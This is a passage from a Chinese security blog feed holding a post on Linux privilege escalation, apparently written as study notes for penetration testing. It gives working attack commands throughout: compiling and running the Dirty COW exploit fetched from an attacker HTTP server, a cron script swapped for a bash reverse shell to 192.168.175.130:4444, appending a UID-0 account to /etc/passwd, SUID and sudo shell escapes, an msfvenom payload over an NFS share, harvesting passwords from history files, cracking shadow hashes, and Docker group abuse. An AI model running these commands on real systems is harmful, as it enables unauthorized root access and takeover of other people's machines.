class="line">searchsploit -s Linux Kernel 4.15.0</span><br></pre></td></tr></table></figure></li></ol><p>方法二：<br>官网，或其它网站查找</p><ol start="3"><li>复制到当前目录，上传编译赋权执行。<br>找到可利用的脚本之后，查看路径信息，并复制一个到当前目录（别损坏了漏洞库中原文件）：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -x linux/local/47169.c</span><br><span class="line"><span class="built_in">cp</span> /usr/share/exploitdb/exploits/linux/local/47169.c ./</span><br></pre></td></tr></table></figure></li></ol><p>如果有其它webshell，有上传权限，那就把这个脚本拿出来，上传上去，再执行就好。</p><p>如果没有其它上传途径，可以在攻击方本地开一个http服务，让目标来下载也行：（开的服务默认在根目录起始）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http-server 80</span><br><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure><p>之后将脚本放到根目录，然后让目标机来下载即可：<br><code>wget http://192.168.1.130/47196.c -O /tmp/47169.c</code><br>下载并保存到&#x2F;tmp目录下</p><p>编译，加权限，执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gcc 47169.c -o exp</span><br><span class="line"><span class="built_in">chmod</span> +x exp</span><br><span class="line">./exp</span><br><span class="line"></span><br><span class="line">// <span class="built_in">id</span>测试是否提权成功</span><br><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></table></figure><p><a href="https://github.com/The-Z-Labs/linux-exploit-suggester">Linux_Exploit_Suggester</a><br>很好用的一款提权辅助工具，用法很简单，在靶机上执行.&#x2F;linux-exploit-suggester.sh就会列出该靶机上可利用的漏洞编号.</p><h2 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h2><p>漏洞信息：CVE-2016-5195漏洞（Dirty COW，脏牛）<br>影响范围：Linux 内核2.6.22 – 3.9 (x86&#x2F;x64)<br>漏洞EXP：<a href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a><br>漏洞成因：<br>Linux写时拷贝技术（copy-on-write）<br>在Linux系统中，fork()会产生一个和父进程完全相同的子进程，但子进程在此后多会exec系统调用，出于效率考虑，Linux系统中引入了“写时复制”技术，也就是只有进程空间的各段的内容要发生变化时，才会将父进程的内容复制一份给子进程。</p><p>首先，搜索发行版本和内核版本，确认在Dirty Cow影响范围内。<br>利用 <code>serachsploit linux 3.2.78</code> 搜索该版本漏洞。<br>可以找到几个赃牛漏洞脚本，这里示例为40839.c脚本</p><p>将该脚本下载&#x2F;上传到目标机下。</p><p>然后编译该脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread 40839.c -o 40839 -lcrypt</span><br><span class="line"></span><br><span class="line">-pthread  在Linux中要用到多线程时，需要链接pthread库</span><br><span class="line">-o 40839  gcc生成的目标文件,名字为40839</span><br><span class="line">-lcrypt   添加需要的外部库</span><br></pre></td></tr></table></figure><p>添加可执行权限并执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x ./dirty</span><br><span class="line">./dirty 999999</span><br></pre></td></tr></table></figure><p>之后就可以直接用密码999999登录root权限账户firefart</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su firefart</span><br><span class="line">999999</span><br></pre></td></tr></table></figure><p>在运行漏洞利用后恢复 &#x2F;etc&#x2F;passwd<br><code>mv /tmp/passwd.bak /etc/passwd</code></p><h1 id="定时任务提权"><a href="#定时任务提权" class="headerlink" title="定时任务提权"></a>定时任务提权</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>定时任务(Cron job)是Linux系统中的一个守护进程，用于调度重复任务，通过控制crontab可以让系统周期性地执行某些命令或脚本。cron是Linux系统中最为实用的工具之一，但是也可能被黑客用于提权操作。由于cron通常以root特权运行，如果我们可以修改其调度的任何脚本或二进制文件，那么便可以使用root权限执行任意代码。<br>默认情况下，使用环境变量有限的&#x2F;bin&#x2F;shshell</p><p>Cron tables存储了Cron jobs的配置<br>User Crontabs通常位于&#x2F;var&#x2F;spool&#x2F;cron&#x2F;or&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;<br>system系统的crontab位于&#x2F;etc&#x2F;crontab</p><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><ol><li><p>运用如下命令列出计划任务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /etc/cron*</span><br><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br></pre></td></tr></table></figure></li><li><p>在服务器上查找overwrite.sh 文件：<br><code>locate overwrite.sh</code><br><code>/usr/local/bin/overwrite.sh</code></p></li><li><p>检查文件的权限<br><code>ls -l /usr/local/bin/overwrite.sh</code><br>注意：这个文件是可写的</p></li><li><p>将 overwrite.sh文件的内容替换为：<br><code>#!/bin/bash bash -i &gt;&amp; /dev/tcp/192.168.175.130/4444 0&gt;&amp;1</code></p></li><li><p>kali上运行nc<br>等待 cron jobs运行，返回root权限</p></li><li><p>定时任务创建<br>编写一个脚本test.py ，将其权限置为所有用户可读可写可操作： <code>chmod 777 test.py</code></p></li></ol><p>而后修改crontab文件，将定时任务注册到系统中：<code>vim /etc/crontab</code><br>在末尾加上 <code>*/1 *   * * *   root    python  /home/ubuntu/test.py</code><br>表示每1分钟运行一次test.py。<br>至此，定时任务创建成功。</p><ol start="3"><li>提权操作<br>假设通过之前的渗透操作，获得了低权限的用户ubuntu。<br>查看crontab文件： <code>cat /etc/crontab</code><br>发现存在定时任务，以root身份定时运行 <code>/home/ubuntu/test.py</code><br>而test.py文件是任意成员可写的，于是向其代码尾部追加以下内容：<br><code>os.chmod(“/etc/passwd”,stat.S_IRWXU|stat.S_IRWXG|stat.S_IRWXO)</code><br>将passwd文件权限设置为任意成员可写。</li></ol><p>一分钟之后，程序自动运行，发现passwd已经任意成员可写。</p><p>接下来需要做的就是构造一个用户，在密码占位符处指定密码，UID设置为0，并将其添加到 &#x2F;etc&#x2F;passwd 文件中。</p><p>首先，使用perl语言生成带有盐值的密码：<br><code>perl -le &#39;print crypt(&quot;hack&quot;,&quot;addedsalt&quot;)&#39;</code></p><p>而后，拼接密码，将以下字符串写入&#x2F;etc&#x2F;passwd文件，之后便拥有了一个超级用户hack：hack。<br><code>hack:adCP9//qaScc2:0:0:User_like_root:/root:/bin/bash</code></p><p>最后，登录hack用户，自动跳转到root用户，提权成功！</p><h1 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>SUID（Set UID, 设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。为可执行文件添加suid权限的目的是简化操作流程，让普通用户也能做一些高权限才能做的的工作。但是如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为root。</p><p>SUID提权的原理与Linux进程的UID有关，进程在运行的时候有以下三个UID：</p><p>（A）Real UID：执行该进程的用户的UID。Real UID只用于标识用户，不用于权限检查。</p><p>（B）Effective UID（EUID）：进程执行时生效的UID。在对访问目标进行操作时，系统会检查EUID是否有权限。一般情况下，Real UID与EUID相同，但在运行设置了SUID权限的程序时，进程的EUID会被设置为程序文件属主的UID。</p><p>（C）Saved UID：在高权限用户降权后，保留的UID。</p><p>如果某个设置了SUID权限的程序运行后创建了shell，那么shell进程的EUID也会是这个程序文件属主的UID，如果属主为root，便是一个root shell。root shell中运行的程序的EUID也都是0，具备超级权限，于是便实现了提权。</p><p>1、SUID权限仅对二进制程序(binary program)有效；<br>2、执行者对于该程序需要具有执行(x)的可执行权限；<br>3、本权限仅在执行该程序的过程中有效(run-time)；<br>4、执行者将具有该程序拥有者(owner)的权限。</p><p>SUID的目的就是：让本来没有相应权限的用户运行这个程序时，可以访问他没有权限访问的资源。</p><h2 id="SUID权限"><a href="#SUID权限" class="headerlink" title="SUID权限"></a>SUID权限</h2><p>通过以下命令，可找到具有SUID权限的参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000-print2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000-<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; \;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 三选一</span></span><br><span class="line"><span class="comment"># /表示从文件系统的顶部（根）开始并找到每个目录</span></span><br><span class="line"><span class="comment"># -perm 表示搜索随后的权限</span></span><br><span class="line"><span class="comment"># -u = s表示查找root用户拥有的文件</span></span><br><span class="line"><span class="comment"># -type表示我们正在寻找的文件类型</span></span><br><span class="line"><span class="comment"># f 表示常规文件，而不是目录或特殊文件</span></span><br><span class="line"><span class="comment"># 2表示该进程的第二个文件描述符，即stderr（标准错误）</span></span><br></pre></td></tr></table></figure><p>SUID设置方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u+s &lt;filename&gt;</span><br><span class="line"><span class="built_in">chmod</span> u-s &lt;filename&gt;</span><br></pre></td></tr></table></figure><p>常见SUID提权文件有：<br>nmap、vim、find、more、less、bash、cp、Nano、mv、awk、man、weget</p><ol><li>nmap<br>旧版本的 Nmap（2.02 到 5.21）具有交互模式，允许用户执行 shell 命令。由于 Nmap 位于以 root 权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的 shell。</li></ol><p><code>nmap --interactive  # 启动交互模式</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap&gt; !sh</span><br><span class="line">sh-3.2<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>或者有一个 Metasploit 模块，它通过 SUID Nmap 二进制文件执行权限提升。<br><code>exploit/unix/local/setuid_nmap</code></p><ol start="2"><li>find<br>实用程序find可用于发现存储在系统上。然而，它是执行命令的能力。因此，如果它被配置为使用 SUID 权限运行，那么所有将通过 find 执行的命令都将以 root 身份执行。</li></ol><p>非root权限下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> abc</span><br><span class="line">find abc -<span class="built_in">exec</span> <span class="built_in">whoami</span> \;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"></span><br><span class="line">find . -<span class="built_in">exec</span> /bin/sh -p \; -quit <span class="comment"># 输入命令，返回shell</span></span><br></pre></td></tr></table></figure><ol start="3"><li>vim<br>Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运行，它将继承 root 用户的权限，因此它可以读取系统上的所有文件。</li></ol><p><code>vim.tiny /etc/shadow</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 还可以通过vim来打开shell</span></span><br><span class="line"></span><br><span class="line">vim.tiny</span><br><span class="line"></span><br><span class="line"><span class="comment"># Press ESC key</span></span><br><span class="line">:<span class="built_in">set</span> shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><ol start="4"><li><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -p <span class="comment"># 进入bash命令交互模式</span></span><br><span class="line">bash-3.2<span class="comment"># id # 以root权限执行id</span></span><br><span class="line">uid=1002(service) gid=1002(service) euid=0(root) <span class="built_in">groups</span>=1002(service)<span class="comment"># 结果</span></span><br></pre></td></tr></table></figure></li><li><p>less &amp; more</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line"></span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure></li><li><p>make</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">COMMAND=<span class="string">&#x27;/bin/sh -p&#x27;</span></span><br><span class="line">make -s -<span class="built_in">eval</span>=$<span class="string">&#x27;x:\n\t-&#x27;</span><span class="string">&quot;<span class="variable">$COMMAND</span>&quot;</span> <span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure></li><li><p>flock</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flock -u / /bin/sh -p <span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure></li><li><p>env</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">env</span> /bin/sh -p <span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure></li><li><p>python</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import os; os.execl(&quot;/bin/sh&quot;,&quot;sh&quot;,&quot;-p&quot;)&#x27;</span>  <span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="Sudo滥用提权"><a href="#Sudo滥用提权" class="headerlink" title="Sudo滥用提权"></a>Sudo滥用提权</h1><h2 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h2><p>sudo 是一个程序，允许用户运行具有其他用户安全特权的其他程序。</p><p>默认情况下，该其他用户将是root用户<br>用户通常需要输入密码才能使用sudo，并且必须允许用户通过&#x2F;etc&#x2F;sudoersfile文件中的规则访问。<br>规则可用于将用户限制在某些程序中，并放弃密码输入要求。<br>在一般用户需要取得特殊权限时，其可在命令前加上“sudo”，此时sudo将会询问该用户自己的密码（以确认终端机前的是该用户本人），回答后系统即会将该命令的进程以超级用户的权限运行。之后的一段时间内（默认为5分钟，可在&#x2F;etc&#x2F;sudoers自定义），使用sudo不需要再次输入密码。</p><h2 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo &lt;program&gt;  <span class="comment"># 使用sudo运行程序</span></span><br><span class="line">sudo -u &lt;username&gt; &lt;program&gt; <span class="comment"># 以特定用户的身份运行程序</span></span><br><span class="line">sudo -l <span class="comment"># 允许（且不允许）运行列出用户的程序</span></span><br><span class="line">sudo su <span class="comment"># 通过使用交换用户su命令生成root</span></span><br><span class="line">sudo -s sudo -i sudo /bin/bash sudo passwd <span class="comment"># </span></span><br></pre></td></tr></table></figure><p>在sudoers中增加以下内容，可以使用户user_test可以从任何终端运行，以root用户身份运行命令find 而无需密码。</p><p><code>user_test  ALL = (root) NOPASSWD: /usr/bin/find</code></p><p>可以利用sudo提权的命令如下：<br><code>wget、find、cat、apt、zip、xxd、time、taskset、git、sed、pip、ed、tmux、scp、perl、bash、less、awk、man、vi、env、ftp</code></p><h3 id="权限配置"><a href="#权限配置" class="headerlink" title="权限配置"></a>权限配置</h3><p>新建普通用户sudo_test，而后切换到root用户，执行以下动作：</p><p>添加文件的写权限： <code>chmod u+w /etc/sudoers</code></p><p>向sudoer文件中添加以下内容（可按需增加）：<br><code>sudo_test   ALL= (root) NOPASSWD: /usr/bin/find, (root) NOPASSWD: /usr/bin/vim,(root) NOPASSWD:/usr/bin/awk,(root) NOPASSWD:/usr/bin/man,(root) NOPASSWD:/usr/bin/less,(root) NOPASSWD:/bin/more,(root) NOPASSWD:/bin/tar,(root) NOPASSWD:/usr/bin/zip</code></p><p>撤销文件的写权限： <code>chmod u-w /etc/sudoers</code></p><h3 id="提权操作"><a href="#提权操作" class="headerlink" title="提权操作"></a>提权操作</h3><p>当前已经获取到低权限用户sudo_test，使用 <code>sudo -l</code> 命令查看本用户允许使用的sudo程序。</p><p><img src="/simg/Linux_Privilege_Escalation_2.png" alt=" "></p><ol><li><p>find</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find /etc/passwd -<span class="built_in">exec</span> /bin/sh \ <span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure></li><li><p>vim</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim -c <span class="string">&#x27;!sh&#x27;</span> <span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure></li><li><p>awk</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span> <span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure></li><li><p>less</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo less /etc/hosts</span><br><span class="line">!</span><br><span class="line">(Enter) <span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure></li><li><p>man</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo man man</span><br><span class="line">!</span><br><span class="line">(enter) <span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="外壳逃生序列"><a href="#外壳逃生序列" class="headerlink" title="外壳逃生序列"></a>外壳逃生序列</h2><p>即使没有”明显”的方法来升级特权，我们也可以使用外壳逃生序列。</p><p>即使我们仅限于通过sudo运行某些程序，有时也有可能”逃避”程序并生成壳。<br>由于初始程序具有root权限运行，因此生成的外壳也是如此。<br>此处可以找到带有外壳逃生序列的程序列表：<a href="https://gtfobins.github.io/">https://gtfobins.github.io</a></p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol><li>列出允许用户运行的程序<br><code>sudo -l</code></li></ol><p><img src="/simg/Linux_Privilege_Escalation.png" alt=" "></p><ol start="2"><li><p>对每个程序进行查表，要细心<br><a href="https://gtfobins.github.io/">GTFObins</a></p></li><li><p>如果存在逃生序列，则通过sudo 运行程序并执行序列以生成根壳。</p></li></ol><h1 id="NFS提权"><a href="#NFS提权" class="headerlink" title="NFS提权"></a>NFS提权</h1><h2 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h2><p>NFS（网络文件系统）是一种分布式文件系统协议，NFS允许系统通过网络与其他人共享目录和文件。<br>在NFS文件共享中，用户甚至程序可以访问远程系统上的信息，就像它们驻留在本地计算机上一样。<br>NFS中的Root Squashing（root_sqaush）参数阻止对连接到NFS卷的远程root用户具有root访问权限。当该参数设置为no_root_squash时，登入 NFS 主机使用分享目录的使用者如果是 root 的话，那么对于这个分享的目录来说，他就具有 root 的权限，基于此原理便可实现提权。</p><p>NFS共享在&#x2F;etc&#x2F;exports文件中配置。<br>远程用户可以安装共享、访问、创建、修改文件。<br>默认情况下，创建的文件会继承remote用户的ID和组ID(分别作为所有者和组)，即使它们不存在 NFS 服务器上。</p><h2 id="相关命令-1"><a href="#相关命令-1" class="headerlink" title="相关命令"></a>相关命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">showmount -e &lt;target&gt; <span class="comment"># 显示NFS服务器的导出列表</span></span><br><span class="line">nmap -sV -script=nfs-showmount &lt;target&gt; <span class="comment"># 类似的nmap脚本</span></span><br><span class="line">mount -o rw,vers=2 &lt;target&gt;:&lt;share&gt; &lt;local_directory&gt; <span class="comment"># 安装NFS共享</span></span><br></pre></td></tr></table></figure><p><strong>Root Squashing</strong><br>Root Squashing是 NFS如何防止明显的特权升级。<br>如果远程用户是(或声称是)root(uid&#x3D;0)，NFS将改为”squash”用户，就好像他们是”nobody”用户一样，在”nogroup”组中。<br>虽然此行为是默认的，但它可以禁用！</p><p><strong>no_root_squash</strong><br>no_root_squash是一个 NFS 配置选项，它关闭root的squash。<br>当包含在可写入的共享配置中时，识别为”root”的远程用户可以作为本地根用户在 NFS 共享上创建文件。</p><h2 id="实操-1"><a href="#实操-1" class="headerlink" title="实操"></a>实操</h2><ol><li><p>检查 &#x2F;etc&#x2F;exports 的内容，了解具有no_root_squash选项的配置：<br><code>cat /etc/exports</code></p></li><li><p>确认NFS共享可用于远程安装：<br><code>showmount -e 192.168.1.25</code></p></li><li><p>在kali上创建一个文件夹，并安装&#x2F;tmp NFS共享：<br><code>mkdir /tmp/nfs mount -o rw,vers=2 192.168.175.228:/tmp /tmp/nfs</code></p></li><li><p>使用kali上的root用户生成有效载荷并将其保存到安装的共享中：<br><code>msfvenom -p linux/x86/exec CMD=&quot;/bin/bash -p&quot; -f elf -o /tmp/nfs/shell.elf</code></p></li><li><p>确保文件具有SUID集，并且每个用户都可执行：<br><code>chmod +xs /tmp/nfs/shell.elf</code></p></li><li><p>在目标机器上。执行文件以获取root：<br><code>/tmp/shell.elf bash-4.1</code></p></li></ol><h1 id="password-amp-key-提权"><a href="#password-amp-key-提权" class="headerlink" title="password &amp; key 提权"></a>password &amp; key 提权</h1><h2 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h2><ol><li>密码<br>虽然这看起来可能很漫长，但弱密码存储和密码重复使用可能是升级权限的简单方法。<br>虽然root用户的帐户密码被隐藏起来，并安全地存储在&#x2F;etc&#x2F;shadow中<br>但其他密码（如用于服务的密码）可能会 以普通文本存储在配置文件中。<br>如果根用户将密码重新用于服务，则可能会找到该密码并用于切换到根用户。</li></ol><p>大多数linux系统的密码都和&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;shadow这两个配置文件息息相关。passwd里面储存了用户，shadow里面是密码的hash。出于安全考虑passwd是全用户可读，root可写的。shadow是仅root可读写的。<br>当我们的passwd和shadow一些权限配置不当就可能会导致提权</p><p><strong>passwd文件</strong><br><code>test:x:1000:1000::/home/test:/bin/bash</code><br>passwd 由冒号分割，第一列是用户名，第二列是密码，x 代表密码 hash 被放在 shadow 里面了（非root用户不可读）。<br>当我们的passwd文件给普通用户配置了写权限，那么我们就可以通过修改x为一段已知的密码的hash值来进行提权。</p><p><strong>shadow文件</strong><br><code>test:$6$Mqh9T8ip$4Ev.HJTBdyobrYaW/KzBlL0yx6wefeB.VDcE7KiDiwoUvGkqShU9jRK4cEZA2kBRsyH2fWjmbxc/ZyVWfXwFJ/:18849:0:99999:7:::</code><br>假如我们对shadow文件有读取权限我们就可以利用hash、john等对其进行爆破<br>这里以john为例进行演示，首先把passwd和shadow两文件放在同一文件下</p><p>然后进行破解<br><code>john --user=test test.hash</code></p><ol start="2"><li>历史文件<br>历史文件记录用户在使用某些程序时发出的命令。<br>如果用户将密码键入命令的一部分，此密码可能会存储在历史记录文件中。<br>尝试使用发现ed 密码切换到根</li></ol><h2 id="实操-2"><a href="#实操-2" class="headerlink" title="实操"></a>实操</h2><ol><li>查看用户&#x2F;home目录中隐藏文件的内容，文件名以“历史记录”结尾：<br><code>cat ~/.*history | less</code></li></ol><p>两次q退出来<br>似乎连接到MySQL服务器的用户<br><code>rootpassword123</code></p><ol start="2"><li>su登录<br><img src="/simg/Linux_Privilege_Escalation_3.png" alt=" "></li></ol><h1 id="Docker提权"><a href="#Docker提权" class="headerlink" title="Docker提权"></a>Docker提权</h1><p>除了利用Linux系统自带的工具进行提权，还可以利用大量存在风险的第三方工具进行提权，本文以Docker为例进行演示。 随着云化时代的来临，docker也越来越流行，在很多公司内部的linux机器上docker已然成了标配。Docker使用便捷，有以下几个特性：</p><p>（1）可免sudo使用docker：默认情况下使用docker必须要有sudo权限，对于一台机器多用户使用，往往很多用户只有普通权限。为了让普通用户也可以使用Docker，管理员将需要使用docker的用户添加到docker用户组(安装docker后默认会创建该组)中，用户重新登录机器即可免sudo使用docker了。</p><p>（2）容器内用户权限不受限：用户创建一个docker容器后，容器内默认是root账户，在不需要加sudo的情况下可以任意更改容器内的配置。正常情况下，这种模式既可以保证一台机器被很多普通用户使用，通过docker容器的隔离，相互之前互不影响；也给用户在容器内开放了充足的权限保证用户可以正常安装软件，修改容器配置等操作。</p><p>（3）容器内外文件可映射：docker提供了一个-v选项，提供用户将容器外的host目录映射进容器内，方便的进行容器内外的文件共享。</p><p>结合上面三个特点，可以实现用户提权操作。</p><ol><li><p>用户配置<br>使用管理员新建一个普通用户user_docker，并将其添加到docker组中：<br><code>sudo gpasswd -a user_docker docker</code></p></li><li><p>提权操作<br>通过前期的渗透操作，拿下user_docker的权限，下面对其进行提权。<br>首先，运行一个容器：<br><code>docker run -it -v /etc:/etc ubuntu /bin/bash</code><br>将宿主机的&#x2F;etc目录直接映射进容器，从而覆盖了容器内的&#x2F;etc目录。<br>由于linux系统上的本地用户信息主要记录在&#x2F;etc&#x2F;目录下，比如两个常见文件&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;group，而在容器内当前用户有root权限，于是可以随意修改这两个文件，实现提权：</p></li></ol><p>修改&#x2F;etc&#x2F;passwd文件，可更改root密码，或者新增一个uid&#x3D;0的用户。</p><p>修改&#x2F;etc&#x2F;group文件，将当前用户添加到sudo组中。</p><p>本文演示第二种方法，在容器内执行下列命令：<br><code>usermod -aG sudo user_docker</code><br>将user_docker用户加载到sudo组中，而后退出容器。</p><p>查看宿主机文件&#x2F;etc&#x2F;group，可见user_docker已经拥有sudo权限，提权成功！</p><p>除此之外，DockerHub上已经有人将exp打包成镜像rootplease 。<br>只要用户在 docker 组中，运行下面命令就能直接在 docker 中获取到 root 权限:<br><code>docker run -v /:/hostOS -it chrisfosterelli/rootplease</code><br>容器生成后自动获取到宿主机的 root 权限，并启动 shell 程序，直接在 docker 中执行命令。</p><p>在这种多用户借助docker共用一台机器的情况下，普通用户可以借助docker提升为sudo用户，从而可以进行任意修改系统配置等各种恶意操作。<br>以上是本地用户的破坏还不是很明显，毕竟是公司内部用户大多不会进行恶意操作。然而，很多情况下普通用户为了方便，用户密码往往设置得很简单，如果攻击者通过其他途径暴力破解普通用户弱口令，就可以很轻松得提示为管理员从事不可限制的恶意操作，这也大大降低了攻击者的攻击难度。</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.nsfocus.net/linux/">LINUX提权手法实践</a><br><a href="https://www.cnblogs.com/sfsec/p/15163907.html">Linux提权总结</a><br><a href="https://www.freebuf.com/articles/system/362070.html">Linux提权姿势总结</a><br><a href="https://www.freebuf.com/articles/web/280398.html">手把手教你Linux提权</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;Linux提权方式的复习与学习。&lt;/p&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="提权" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透之反弹shell</title>
    <link href="http://example.com/2023/08/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%8F%8D%E5%BC%B9shell/"/>
    <id>http://example.com/2023/08/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%8F%8D%E5%BC%B9shell/</id>
    <published>2023-08-27T16:00:00.000Z</published>
    <updated>2023-08-28T08:33:45.181Z</updated>
    
